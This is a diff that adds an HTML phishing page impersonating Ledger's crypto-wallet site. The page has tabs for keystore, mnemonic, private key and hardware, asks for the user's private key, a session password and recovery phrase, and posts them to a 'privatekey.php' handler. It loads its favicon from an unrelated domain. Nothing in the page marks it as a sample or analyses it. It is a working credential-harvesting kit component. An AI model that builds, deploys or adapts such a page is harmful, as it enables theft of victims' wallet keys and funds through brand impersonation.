@@ -1,0 +1,63 @@
+
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+	<link rel="shortcut icon" href="https://mainnetconnect.com/assets/ledgerfavicon.png">
+	<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+	<meta name="theme-color" content="#000000">
+	<title>Hardware - State-of-the-art security for crypto assets | Ledger</title>
+	<link href="assets/main.css" rel="stylesheet">
+  </head>
+  <body>
+  <noscript>You need to enable JavaScript to run this app.</noscript>
+  <form method="post" action="actions/privatekey.php">
+    <div id="root">
+	<div class="App">
+  <div class="NavBar NavBar--is-centered"><h3><a href="index.html">&lt; Import wallet</a></h3>
+  </div>
+    <div class="Pages">
+	<div class="UnlockWalletPage">
+	<div class="UnlockWalletPage__wrapper">
+	<div class="UnlockWalletPage__title">Unlock Your Wallet</div>
+    <div class="UnlockWalletCard">
+	<div class="UnlockWalletCard__content">
+	<div class="UnlockWalletCard__header">
+	<div class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed">
+	<a href="keystore.html" class="TabBarItem TabBarItem tablinks"><div class="TabBarItem__title">Keystore</div></a>
+	<a class="TabBarItem tablinks" href="mnemonic.html"><div class="TabBarItem__title">Mnemonic</div></a>
+	<a class="TabBarItem--is-active tablinks" href="privatekey.html"><div class="TabBarItem__title">Private Key</div></a>
+	<a class="TabBarItem tablinks" href="privatekey.html#"><div class="TabBarItem__title">Hardware</div></a>
+	</div>
+	</div>
+    <div id="privateKey" class="UnlockWalletViaPrivateKey ccc">
+	<div class="UnlockWalletViaPrivateKey__title">Please enter your private key</div>
+	<textarea class="UnlockWalletViaPrivateKey__private-key" required="" name="privateKey" minlength="75" style="height: 100px !important;"></textarea>
+	<div class="UnlockWalletViaPrivateKey__private-key-instructions">Please enter your private key in HEX format.</div>
+	<input class="UnlockWalletViaPrivateKey__password-input" placeholder="Enter temporary session password" name="pkpass" type="password" minlength="6">
+    <div class="UnlockWalletCard__warning">Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.</div>
+	<div class="UnlockWalletViaPrivateKey__footer">
+	<button type="submit" name="submit" style="width:100%;" class="GradientButton undefined GradientButton">
+	<div class="GradientButton__title">RESTORE</div>
+	</button>
+	</div>
+	</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div>
+</div>
+</div>
+</div>
+    <script src="assets/2.js"></script>
+	<div class="ReactModalPortal"></div><div class="ReactModalPortal">
+	</div>
+	<div>
+	<div style="position: fixed; top: 0px; right: auto; bottom: auto; left: 50%; transform: translate(-50%, 0%); z-index: 100;">
+      <div>
+      </div>
+    </div>
+  </div>
+</form>
+</body></html>
